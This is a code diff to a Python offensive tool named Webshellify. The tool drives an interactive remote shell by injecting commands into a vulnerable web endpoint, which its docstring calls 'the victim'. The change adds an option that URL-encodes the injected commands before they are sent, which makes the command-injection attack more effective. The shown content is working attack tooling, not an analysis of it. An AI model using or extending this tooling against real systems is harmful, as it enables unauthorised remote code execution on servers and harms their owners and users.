@@ -6,6 +6,7 @@ import getch
 import re
 import requests as req
 import sys
+import urllib
 
 class Webshellify:
     """
@@ -208,7 +209,7 @@ headers: {self.headers}
             self.parentdir = self.__get_parent_dir(self.workdir)
             self.user = "?"
 
-    def create_shell(self):
+    def create_shell(self, **kwarg):
         """
         Creates an interactive shell that connects to the hostname and path as
         specified during initialization.
@@ -222,7 +223,16 @@ headers: {self.headers}
         format for the command injection to be successful. Along with this, any
         additional request information to properly perform the remote code
         execution must also be specified.
+
+        parameters
+        ----------
+        - urlencode (boolean, kwarg) - if True, injected commands will be url-
+        encoded before being sent to the victim
         """
+        urlencode = False
+        if("urlencode" in kwarg.keys()):
+            urlencode = kwarg["urlencode"]
+
         input_handler = _input_str()
         self.__get_init_info()
         # capture KeyboardInterrupts
@@ -242,6 +252,9 @@ headers: {self.headers}
 
                 if(self.debug):
                     print(f"[debug] in funct `create_shell`\nworking directory : {self.workdir}\nparent directory : {self.parentdir}")
+
+                if(urlencode):
+                    command = urllib.parse.quote(command)
 
                 workdir, output = self.send_command(command, chdir=True)
                 self.workdir = workdir
